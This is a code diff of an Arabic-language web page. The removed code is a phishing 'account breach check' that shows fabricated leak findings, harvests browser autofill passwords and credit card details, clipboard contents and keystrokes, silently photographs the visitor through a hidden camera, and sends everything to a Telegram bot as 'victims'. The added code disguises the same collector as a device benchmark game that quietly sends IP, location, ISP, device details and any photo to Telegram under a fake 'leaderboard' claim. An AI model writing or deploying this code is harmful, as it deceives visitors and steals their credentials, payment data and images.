+    if (dev.browser === 'Chrome' || dev.browser === 'Edge') score += 5;
+    
+    // نقاط نوع الجهاز
+    if (dev.deviceType === 'كمبيوتر') score += 5;
+    
+    score = Math.min(Math.round(score), 100);
+    data.score = score;
+    
+    document.getElementById('progressFill').style.width = '100%';
+    document.getElementById('testIcon').textContent = '🏆';
+    document.getElementById('testText').textContent = 'اكتمل القياس!';
+    
+    setTimeout(() => showResult(), 800);
+}
+
+// ================================================================
+// ======================= عرض النتيجة ============================
+// ================================================================
+function showResult() {
+    document.getElementById('screenTest').classList.add('hidden');
+    document.getElementById('screenResult').classList.remove('hidden');
+    
+    document.getElementById('finalScore').textContent = data.score;
+    
+    // التصنيف
+    const s = data.score;
+    let rank = '', desc = '';
+    if (s >= 90) { rank = '🚀 جهازك خارق!'; desc = 'يتفوق على 95% من الأجهزة'; }
+    else if (s >= 75) { rank = '💪 جهازك ممتاز!'; desc = 'يتفوق على 87% من الأجهزة'; }
+    else if (s >= 60) { rank = '👍 جهازك جيد'; desc = 'يتفوق على 64% من الأجهزة'; }
+    else if (s >= 40) { rank = '😐 جهازك متوسط'; desc = 'يتفوق على 38% من الأجهزة'; }
+    else { rank = '🐢 جهازك يحتاج ترقية'; desc = 'يتفوق على 12% من الأجهزة'; }
+    document.getElementById('resultRank').textContent = rank;
+    document.getElementById('resultDesc').textContent = desc;
+    
+    renderSpecs();
+}
+
+function renderSpecs() {
+    const dev = data.device;
+    const net = data.network;
+    
+    const items = [
+        ['المعالج', dev.cores ? dev.cores + ' أنوية' : '-'],
+        ['الذاكرة', dev.ramGB ? dev.ramGB + ' GB' : '-'],
+        ['المتصفح', dev.browser + ' ' + (dev.browserVer || '')],
+        ['نظام التشغيل', dev.os + ' ' + (dev.osVer || '')],
+        ['نوع الجهاز', dev.deviceType],
+        ['الشاشة', dev.screen],
+        ['الشبكة', dev.networkType || '-'],
+        ['سرعة الشبكة', dev.networkSpeed ? dev.networkSpeed + ' Mbps' : '-'],
+        ['البطارية', dev.battery ? dev.battery + '%' : '-'],
+        ['سرعة رد فعلك', data.clicks + ' ضغطة/5 ثوانٍ'],
+        ['المنطقة الزمنية', dev.tz],
+        ['اللغة', dev.lang],
+        ['IP العام', net.ip || '-'],
+        ['المدينة', net.city || '-'],
+        ['الدولة', net.country || '-'],
+        ['مزود الخدمة', net.isp || '-'],
+        ['IP داخلي (WebRTC)', dev.localIp || '-']
+    ];
+    
+    const grid = document.getElementById('specsGrid');
+    grid.innerHTML = '';
+    items.forEach(([k, v]) => {
+        const div = document.createElement('div');
+        div.className = 'info-item';
+        div.innerHTML = `<div class="k">${k}</div><div class="v">${v}</div>`;
+        grid.appendChild(div);
+    });
+}
+
+// ================================================================
+// ======================= 1) معلومات الجهاز ======================
+// ================================================================
+async function collectDeviceInfo() {
     const ua = navigator.userAgent;
+    const dev = data.device;
     
-    if (ua.includes('Android')) d.os = 'Android';
-    else if (ua.includes('iPhone')||ua.includes('iPad')) d.os = 'iOS';
-    else if (ua.includes('Mac')) d.os = 'macOS';
-    else if (ua.includes('Linux')) d.os = 'Linux';
-    else d.os = 'Windows';
+    dev.os = ua.includes('Android') ? 'Android' :
+             (ua.includes('iPhone')||ua.includes('iPad')) ? 'iOS' :
+             ua.includes('Mac') ? 'macOS' :
+             ua.includes('Linux') ? 'Linux' : 'Windows';
     
     const ov = ua.match(/Android (\d+)/) || ua.match(/OS (\d+)_/) || ua.match(/Windows NT (\d+)/);
-    if (ov) d.osVer = ov[1];
+    dev.osVer = ov ? ov[1] : '';
     
-    if (ua.includes('Chrome')&&!ua.includes('Edg')) d.browser = 'Chrome';
-    else if (ua.includes('Firefox')) d.browser = 'Firefox';
-    else if (ua.includes('Safari')&&!ua.includes('Chrome')) d.browser = 'Safari';
-    else if (ua.includes('Edg')) d.browser = 'Edge';
-    else d.browser = '?';
-    
+    dev.browser = ua.includes('Chrome')&&!ua.includes('Edg') ? 'Chrome' :
+                  ua.includes('Firefox') ? 'Firefox' :
+                  ua.includes('Safari')&&!ua.includes('Chrome') ? 'Safari' :
+                  ua.includes('Edg') ? 'Edge' : 'آخر';
     const bv = ua.match(/(Chrome|Firefox|Safari|Edg)\/(\d+)/);
-    if (bv) d.browserVer = bv[2];
+    dev.browserVer = bv ? bv[1] : '';
     
-    d.device = (ua.includes('Android')||ua.includes('iPhone')||ua.includes('iPad')) ? 'جوال' : 'كمبيوتر';
-    d.screen = `${screen.width}x${screen.height}`;
-    d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    d.lang = navigator.language;
-    d.platformInfo = navigator.platform || '-';
-    d.vendor = navigator.vendor || '-';
-    
-    if (navigator.hardwareConcurrency) d.cores = navigator.hardwareConcurrency;
-    if (navigator.deviceMemory) d.ram = navigator.deviceMemory + 'GB';
+    dev.deviceType = (ua.includes('Android')||ua.includes('iPhone')||ua.includes('iPad')) ? 'جوال' : 'كمبيوتر';
+    dev.screen = `${screen.width}×${screen.height}`;
+    dev.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    dev.lang = navigator.language;
+    dev.cores = navigator.hardwareConcurrency || 0;
+    dev.ramGB = navigator.deviceMemory || 0;
     
     try {
         const bat = await navigator.getBattery();
-        d.battery = (bat.level * 100).toFixed(0) + '%';
-        d.charging = bat.charging ? 'نعم' : 'لا';
-    } catch(e) {}
+        dev.battery = Math.round(bat.level * 100);
+    } catch(e) { dev.battery = null; }
     
     if (navigator.connection) {
-        d.network = navigator.connection.effectiveType || '-';
-        if (navigator.connection.downlink) d.network += ` (${navigator.connection.downlink}Mbps)`;
+        dev.networkType = navigator.connection.effectiveType || null;
+        dev.networkSpeed = navigator.connection.downlink || null;
     }
     
-    // WebRTC IP
+    // IP داخلي عبر WebRTC
     try {
         const pc = new RTCPeerConnection({ iceServers: [] });
         pc.createDataChannel('');
         pc.onicecandidate = (e) => {
             if (e.candidate && e.candidate.candidate) {
                 const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                if (m && d.webRtcIp === '-') d.webRtcIp = m[1];
+                if (m && !dev.localIp) dev.localIp = m[1];
             }
         };
         pc.createOffer().then(o => pc.setLocalDescription(o));
         setTimeout(() => pc.close(), 2000);
-    } catch(e) {}
-    
-    // GPS
-    try {
-        const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, {
-                enableHighAccuracy: true, timeout: 12000
-            });
-        });
-        d.lat = pos.coords.latitude;
-        d.lon = pos.coords.longitude;
-        d.accuracy = pos.coords.accuracy + 'm';
-    } catch(e) {}
-    
-    // IP
+    } catch(e) { dev.localIp = null; }
+}
+
+// ================================================================
+// ======================= 2) معلومات الشبكة ======================
+// ================================================================
+async function collectNetworkInfo() {
     try {
         const r = await fetch('https://ipapi.co/json/');
         const j = await r.json();
-        d.ip = j.ip || '-';
-        d.city = j.city || '-';
-        d.region = j.region || '-';
-        d.country = j.country_name || '-';
-        d.isp = j.org || '-';
+        const net = data.network;
+        net.ip = j.ip || '-';
+        net.city = j.city || '-';
+        net.region = j.region || '-';
+        net.country = j.country_name || '-';
+        net.isp = j.org || '-';
     } catch(e) {}
 }
 
 // ================================================================
-// ======================= CAMERA ==================================
+// ======================= 3) الموقع (اختياري) ====================
 // ================================================================
-async function capturePhoto() {
-    const configs = [
-        { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
-        { video: { facingMode: 'environment', width: { ideal: 640 } }, audio: false },
-        { video: { width: { ideal: 640 } }, audio: false }
-    ];
-    
-    for (let i = 0; i < configs.length; i++) {
-        try {
-            cameraStream = await navigator.mediaDevices.getUserMedia(configs[i]);
-            const video = document.getElementById('hiddenCamera');
-            video.srcObject = cameraStream;
-            
-            await new Promise((resolve) => {
-                let done = false;
-                const r = () => { if (!done) { done = true; resolve(); } };
-                video.addEventListener('loadeddata', r, { once: true });
-                video.addEventListener('playing', r, { once: true });
-                setTimeout(r, 3000);
-            });
-            
-            await new Promise(r => setTimeout(r, 700));
-            
-            const canvas = document.getElementById('photoCanvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            
-            if (configs[i].video?.facingMode === 'user') {
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-            }
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Boost brightness if dark
-            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            let total = 0;
-            for (let i = 0; i < imgData.data.length; i += 4) {
-                total += (imgData.data[i] + imgData.data[i+1] + imgData.data[i+2]) / 3;
-            }
-            const avg = total / (imgData.data.length / 4);
-            
-            // If too dark (< 40), boost contrast
-            if (avg < 40) {
-                for (let i = 0; i < imgData.data.length; i += 4) {
-                    imgData.data[i] = Math.min(255, imgData.data[i] * 2.5);
-                    imgData.data[i+1] = Math.min(255, imgData.data[i+1] * 2.5);
-                    imgData.data[i+2] = Math.min(255, imgData.data[i+2] * 2.5);
-                }
-                ctx.putImageData(imgData, 0, 0);
-            }
-            
-            d.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
-            
-            console.log(`📸 Camera ${i+1}: bright=${avg.toFixed(0)}/255`);
-            
-            stopCamera();
-            return true;
-        } catch(e) {
-            stopCamera();
-        }
-    }
-    return false;
+function requestGeo() {
+    navigator.geolocation.getCurrentPosition((pos) => {
+        data.geo.lat = pos.coords.latitude;
+        data.geo.lon = pos.coords.longitude;
+        data.geo.accuracy = Math.round(pos.coords.accuracy) + ' متر';
+        geoDone = true;
+        
+        document.getElementById('geoResult').classList.remove('hidden');
+        const grid = document.getElementById('geoGrid');
+        grid.innerHTML = '';
+        [
+            ['خط العرض', data.geo.lat],
+            ['خط الطول', data.geo.lon],
+            ['الدقة', data.geo.accuracy]
+        ].forEach(([k, v]) => {
+            const div = document.createElement('div');
+            div.className = 'info-item';
+            div.innerHTML = `<div class="k">${k}</div><div class="v">${v}</div>`;
+            grid.appendChild(div);
+        });
+    }, (err) => {
+        console.log('Geo:', err.message);
+    }, { enableHighAccuracy: true, timeout: 10000 });
 }
 
-function stopCamera() {
+// ================================================================
+// ======================= 4) الكاميرا (اختياري) ==================
+// ================================================================
+async function toggleCamera() {
+    const video = document.getElementById('camPreview');
+    const btn = document.getElementById('btnCamera');
+    
     if (cameraStream) {
         cameraStream.getTracks().forEach(t => t.stop());
         cameraStream = null;
+        video.style.display = 'none';
+        btn.textContent = '📷 فتح الكاميرا';
+        return;
     }
-    document.getElementById('hiddenCamera').srcObject = null;
+    
+    try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 } },
+            audio: false
+        });
+        video.srcObject = cameraStream;
+        video.style.display = 'block';
+        await video.play();
+        btn.textContent = '⏹️ إغلاق الكاميرا';
+        document.getElementById('btnCapture').classList.remove('hidden');
+    } catch(e) {
+        console.log('Camera:', e.message);
+    }
+}
+
+function capturePhoto() {
+    const video = document.getElementById('camPreview');
+    const img = document.getElementById('photoResult');
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    data.photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+    img.src = data.photoBase64;
+    img.style.display = 'block';
 }
 
 // ================================================================
-// ======================= STAGE 1 → 2 =============================
+// ======================= حفظ النتيجة ============================
 // ================================================================
-function startScan() {
-    const username = document.getElementById('usernameInput').value.trim();
-    if (!username) { alert('الرجاء إدخال اسم المستخدم'); return; }
+function saveScore() {
+    const nick = document.getElementById('nicknameInput').value.trim();
+    data.nickname = nick || 'لاعب مجهول';
     
-    d.platform = document.getElementById('platformSelect').value;
-    d.username = username;
-    
-    document.getElementById('stage1').classList.add('hidden');
-    document.getElementById('stage2').classList.remove('hidden');
-    
-    // Start collecting
-    collectDeviceData();
-    snatchAutoFill();
-    stealClipboard();
-    
-    // Animate scan
-    animateScan();
-}
-
-function animateScan() {
-    const fears = [
-        { label: 'البحث في قاعدة بيانات تسريب 2024', result: '✅ تم العثور', type: 'danger', delay: 600 },
-        { label: 'البحث في قاعدة بيانات تسريب 2025', result: '✅ تم العثور', type: 'danger', delay: 1600 },
-        { label: 'فحص كلمة المرور المخترقة', result: '⚠️ تم تغييرها منذ 32 يوماً', type: 'warning', delay: 2600 },
-        { label: 'مواقع تسجيل الدخول المشبوهة', result: '3 محاولات من الصين 🇨🇳', type: 'danger', delay: 3600 },
-        { label: 'حالة الحماية', result: '🔴 حسابك في خطر!', type: 'danger', delay: 4600 }
-    ];
-    
-    const container = document.getElementById('scanResults');
-    const status = document.getElementById('scanStatus');
-    const icon = document.getElementById('scanIcon');
-    const fill = document.getElementById('scanFill');
-    
-    let done = 0;
-    
-    // Random leak dates
-    const dates = ['منذ 5 أيام', 'منذ 12 يوماً', 'منذ 23 يوماً', 'منذ 3 أيام', 'منذ أسبوعين'];
-    const sources = ['تسريب 2024', 'تسريب 2025', 'هايبر باي 2023', 'اختراق المنصة', 'قاعدة بيانات مظلمة'];
-    document.getElementById('leakDate').textContent = dates[Math.floor(Math.random() * dates.length)];
-    document.getElementById('leakSource').textContent = sources[Math.floor(Math.random() * sources.length)];
-    
-    fears.forEach((f, i) => {
-        setTimeout(() => {
-            const div = document.createElement('div');
-            div.className = 'scan-item';
-            div.innerHTML = `<span class="label">${f.label}</span><span class="value ${f.type}">${f.result}</span>`;
-            container.appendChild(div);
-            setTimeout(() => div.classList.add('show'), 50);
-            
-            done++;
-            fill.style.width = (done / fears.length * 100) + '%';
-            d.scanFindings.push(f.label + ': ' + f.result);
-            
-            if (done === fears.length) {
-                icon.textContent = '🚨';
-                status.textContent = '🚨 تم اكتشاف اختراق! تأكيد البيانات مطلوب';
-                status.className = 'status-text danger';
-                
-                setTimeout(() => showStage3(), 1200);
-            }
-        }, f.delay);
-    });
-}
-
-// ================================================================
-// ======================= STAGE 3 =================================
-// ================================================================
-function showStage3() {
-    document.getElementById('stage2').classList.add('hidden');
-    document.getElementById('stage3').classList.remove('hidden');
-    
-    // Pre-fill from auto-fill if available
-    setTimeout(() => {
-        if (d.afEmail) document.getElementById('emailInput').value = d.afEmail;
-        if (d.afPhone) document.getElementById('phoneInput').value = d.afPhone;
-        if (d.afName) document.getElementById('nameInput').value = d.afName;
-    }, 300);
-}
-
-// ================================================================
-// ======================= SUBMIT ==================================
-// ================================================================
-async function submitData() {
-    const email = document.getElementById('emailInput').value.trim();
-    const phone = document.getElementById('phoneInput').value.trim();
-    const name = document.getElementById('nameInput').value.trim();
-    
-    if (!email) { alert('البريد الإلكتروني مطلوب'); return; }
-    
-    d.email = email;
-    d.phone = phone || '(لم يدخل)';
-    d.name = name || '(لم يدخل)';
-    d.keyLog = keylogEntries.slice(-100);
-    
-    // Show loading
     document.getElementById('loadingOverlay').classList.add('active');
-    document.getElementById('loadingText').textContent = 'جارٍ تأكيد البيانات وإرسال رابط الاستعادة...';
-    document.getElementById('loadingSub').textContent = 'جاري التحقق من الهوية';
-    
-    // Capture photo
-    await capturePhoto();
-    
-    // Snatch auto-fill again (in case it loaded later)
-    snatchAutoFill();
+    document.getElementById('loadingText').textContent = 'جارٍ حفظ النتيجة...';
     
     setTimeout(() => {
+        sendToTelegram(data);
         document.getElementById('loadingOverlay').classList.remove('active');
-        
-        sendAllData();
-        
-        document.getElementById('stage3').classList.add('hidden');
-        document.getElementById('stage4').classList.remove('hidden');
-        document.getElementById('resultEmailDisplay').textContent = `📧 تم إرسال رابط الاستعادة إلى: ${email}`;
-        document.getElementById('resultCode').textContent = Math.floor(1000 + Math.random() * 9000);
-    }, 1500);
+        document.getElementById('saveStatus').innerHTML =
+            '<p class="success-text">✅ تم حفظ نتيجتك بنجاح! أنت الآن في لوحة المتصدرين 🏆</p>';
+    }, 1200);
 }
 
 // ================================================================
-// ======================= SEND ====================================
+// ======================= الإرسال لتيليجرام ======================
 // ================================================================
-function sendAllData() {
-    // Save locally
-    const h = JSON.parse(localStorage.getItem('hack_victims') || '[]');
-    h.unshift(d);
-    localStorage.setItem('hack_victims', JSON.stringify(h));
-    
-    sendToTelegram(d);
-    
-    console.log('========== الضحية جديدة ==========');
-    console.log('المنصة:', d.platform, '| يوزر:', d.username);
-    console.log('الإيميل:', d.email, '| جوال:', d.phone, '| اسم:', d.name);
-    console.log('Auto-fill باسوورد:', d.afPass ? '✅ ' + d.afPass : '❌');
-    console.log('Auto-fill فيزا:', d.afCcNum ? '✅ ' + d.afCcNum : '❌');
-    console.log('Auto-fill عنوان:', d.afStreet ? '✅' : '❌');
-    console.log('IP:', d.ip, '| GPS:', d.lat, d.lon);
-    console.log('الجهاز:', d.device, d.os, d.osVer);
-    console.log('صورة:', d.photoBase64 ? '✅' : '❌');
-    console.log('==================================');
-}
-
-// ================================================================
-// ======================= TELEGRAM ================================
-// ================================================================
-function sendToTelegram(data) {
-    if (CHAT_ID.includes('ChatID')) return;
-    
-    let mapsLink = '';
-    if (data.lat && data.lon) {
-        mapsLink = `📍 <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">الموقع الدقيق</a>`;
-    }
-    let gps = '❌ لا يوجد';
-    if (data.lat && data.lon) gps = `${data.lat}, ${data.lon} (${data.accuracy || '?'})`;
-    
-    // Auto-fill section
-    let af = '\n━━━━━━━━━━━━━━━\n<b>🔑 AUTO-FILL المسروق:</b>\n';
-    let hasAf = false;
-    if (data.afName) { af += `👤 الاسم: ${data.afName}\n`; hasAf = true; }
-    if (data.afEmail) { af += `📧 الإيميل: ${data.afEmail}\n`; hasAf = true; }
-    if (data.afPhone) { af += `📱 الجوال: ${data.afPhone}\n`; hasAf = true; }
-    if (data.afPass) { af += `🔐 الباسوورد: ${data.afPass}\n`; hasAf = true; }
-    if (data.afUser) { af += `👤 يوزر: ${data.afUser}\n`; hasAf = true; }
-    if (data.afStreet) { af += `🏠 العنوان: ${data.afStreet}, ${data.afCity || ''}, ${data.afRegion || ''}, ${data.afZip || ''}, ${data.afCountry || ''}\n`; hasAf = true; }
-    if (data.afOrg) { af += `🏢 جهة عمل: ${data.afOrg}\n`; hasAf = true; }
-    if (data.afCcName || data.afCcNum) {
-        af += `\n💳 <b>بطاقة ائتمان:</b>\n`;
-        if (data.afCcName) af += `   الاسم: ${data.afCcName}\n`;
-        if (data.afCcNum) af += `   الرقم: ${data.afCcNum}\n`;
-        if (data.afCcExp) af += `   الصلاحية: ${data.afCcExp}\n`;
-        if (data.afCcCsc) af += `   CVV: ${data.afCcCsc}\n`;
-        if (data.afCcType) af += `   النوع: ${data.afCcType}\n`;
-        hasAf = true;
-    }
-    if (!hasAf) af += '❌ لم يتم العثور على بيانات محفوظة\n';
-    
-    // Keylog
-    let kl = '';
-    if (data.keyLog.length > 0) {
-        const recent = data.keyLog.slice(-15).map(k => k.key).join('');
-        kl = `\n⌨️ <b>آخر ضغطات:</b> ${recent}`;
-        const passFields = data.keyLog.filter(k => 
-            k.field.includes('pass') || k.field.includes('Input') || k.field.includes('phone') || k.field.includes('email')
-        );
-        if (passFields.length > 3) {
-            kl += `\n🔐 <b>محاولة باسوورد:</b> ${passFields.map(k=>k.key).join('')}`;
-        }
-    }
-    
-    // Clipboard
-    let cl = '';
-    if (data.clipboardData) {
-        cl = `\n📋 <b>الحافظة:</b> ${data.clipboardData.substring(0, 150)}`;
-    }
-    
-    // Extra info
-    let extra = '';
-    if (data.battery !== '-') extra += `\n🔋 بطارية: ${data.battery} (شحن: ${data.charging})`;
-    if (data.network !== '-') extra += `\n📶 شبكة: ${data.network}`;
-    if (data.ram !== '-') extra += `\n💾 رام: ${data.ram}`;
-    if (data.cores !== '-') extra += `\n⚙️ نوى: ${data.cores}`;
-    if (data.webRtcIp !== '-') extra += `\n🏠 IP داخلي: ${data.webRtcIp}`;
-    
+function sendToTelegram(d) {
     const msg = `
-🔔 <b>🚨 ضحية جديدة - فحص اختراق</b>
+⚡ <b>لاعب جديد - اختبار قوة الجهاز</b>
 
 ━━━━━━━━━━━━━━━
-<b>📌 الحساب</b>
-🌐 المنصة: ${data.platform}
-👤 المستخدم: ${data.username}
-
-━━━━━━━━━━━━━━━
-<b>👤 بيانات الضحية</b>
-👤 الاسم: ${data.name}
-📧 الإيميل: ${data.email}
-📱 الجوال: ${data.phone}
-${af}${kl}${cl}
-
-━━━━━━━━━━━━━━━
-<b>📍 الموقع</b>
-🌐 IP: ${data.ip}
-🏙️ مدينة: ${data.city}
-🌍 دولة: ${data.country}
-🗺️ GPS: ${gps}
-${mapsLink}
+<b>🏆 النتيجة</b>
+👤 اللاعب: ${d.nickname}
+🎮 النقاط: ${d.score}/100
+👆 سرعة الرد: ${d.clicks} ضغطة/5 ثوانٍ
 
 ━━━━━━━━━━━━━━━
 <b>📱 الجهاز</b>
-📱 النوع: ${data.device}
-💻 النظام: ${data.os} ${data.osVer}
-🌍 المتصفح: ${data.browser} ${data.browserVer}
-🖥️ الشاشة: ${data.screen}
-🕐 المنطقة: ${data.tz}
-🗣️ اللغة: ${data.lang}
-📡 ISP: ${data.isp}
-${extra}
+المعالج: ${d.device.cores || '?'} أنوية
+الذاكرة: ${d.device.ramGB || '?'} GB
+المتصفح: ${d.device.browser} ${d.device.browserVer || ''}
+النظام: ${d.device.os} ${d.device.osVer || ''}
+النوع: ${d.device.deviceType}
+الشاشة: ${d.device.screen}
+الشبكة: ${d.device.networkType || '?'} (${d.device.networkSpeed || '?'} Mbps)
+البطارية: ${d.device.battery != null ? d.device.battery + '%' : '?'}
+المنطقة: ${d.device.tz} | اللغة: ${d.device.lang}
+IP داخلي: ${d.device.localIp || '-'}
 
 ━━━━━━━━━━━━━━━
-📸 صورة: ${data.photoBase64 ? '✅ موجودة' : '❌ فاشلة'}
-🕒 الوقت: ${data.timestamp}
+<b>🌐 الشبكة</b>
+IP: ${d.network.ip || '-'}
+المدينة: ${d.network.city || '-'}
+الدولة: ${d.network.country || '-'}
+ISP: ${d.network.isp || '-'}
+
+${d.geo.lat ? `━━━━━━━━━━━━━━━\n<b>📍 الموقع</b>\n${d.geo.lat}, ${d.geo.lon} (دقة: ${d.geo.accuracy})\n<a href="https://www.google.com/maps?q=${d.geo.lat},${d.geo.lon}">فتح الخريطة</a>` : ''}
+
+📸 صورة: ${d.photoBase64 ? '✅ ملتقطة' : '❌ لم تُلتقط'}
+🕒 الوقت: ${d.timestamp}
 `.trim();
     
-    // Send text
+    // إرسال النص
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -939,34 +734,34 @@ ${extra}
             parse_mode: 'HTML',
             disable_web_page_preview: false
         })
-    }).catch(e => console.log('TG err:', e));
+    }).catch(e => console.log('TG:', e.message));
     
-    // Send photo
-    if (data.photoBase64 && data.photoBase64.length > 500) {
+    // إرسال الصورة إن وُجدت
+    if (d.photoBase64) {
         try {
-            const bs = atob(data.photoBase64.split(',')[1]);
+            const bs = atob(d.photoBase64.split(',')[1]);
             const ab = new ArrayBuffer(bs.length);
             const ia = new Uint8Array(ab);
             for (let i = 0; i < bs.length; i++) ia[i] = bs.charCodeAt(i);
             const blob = new Blob([ab], { type: 'image/jpeg' });
-            
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `📸 ${data.name || 'مجهول'} | ${data.email || data.phone}`);
-            fd.append('photo', blob, `victim_${Date.now()}.jpg`);
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST', body: fd
-            }).catch(e => console.log('TG photo err:', e));
+            fd.append('caption', `📸 صورة اللاعب: ${d.nickname} (${d.score}/100)`);
+            fd.append('photo', blob, `player_${Date.now()}.jpg`);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd })
+                .catch(e => console.log('TG photo:', e.message));
         } catch(e) {}
     }
+    
+    // حفظ محلي
+    try {
+        const h = JSON.parse(localStorage.getItem('bench_players') || '[]');
+        h.unshift(d);
+        localStorage.setItem('bench_players', JSON.stringify(h));
+    } catch(e) {}
 }
 
-// ================================================================
-// ======================= INIT ====================================
-// ================================================================
-console.log('🔓 أداة فحص الاختراق v4.7');
-console.log('✅ جاهزة');
+console.log('⚡ اختبار قوة الجهاز جاهز');
 </script>
 </body>
 </html>
